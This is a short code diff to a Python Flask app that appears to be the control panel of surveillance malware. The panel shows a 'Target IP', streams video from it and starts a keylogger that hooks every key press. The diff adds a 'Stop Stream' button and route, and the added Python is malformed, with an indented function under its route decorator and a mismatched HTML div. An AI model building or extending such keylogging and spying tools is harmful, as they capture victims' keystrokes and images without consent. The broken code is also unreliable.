@@ -30,8 +30,9 @@ html_template = """
     <div>
       <p><strong>Target IP :</strong> {{ target_ip }}</p>
       <p><strong>Start Time :</strong> {{ start_time }}</p>
-    </div>
-    
+    <div>
+  <a href="{{ url_for('stop_stream') }}" class="button">Stop Stream</a>
+</div>
     <!-- Video Stream Section -->
     <div>
       <img src="{{ url_for('video_feed') }}" width="640" height="480">
@@ -90,6 +91,13 @@ def start_keylogger():
         keyboard.on_press(keylogger_callback)
         keylogger_running = True
         print(Fore.YELLOW + "[ * ] Keylogger started.")
+
+@app.route('/stop_stream')
+    def stop_stream():
+        global streaming
+        streaming = False  # Stop streaming
+        return "Streaming stopped!"
+
 
 def stop_keylogger():
     global keylogger_running
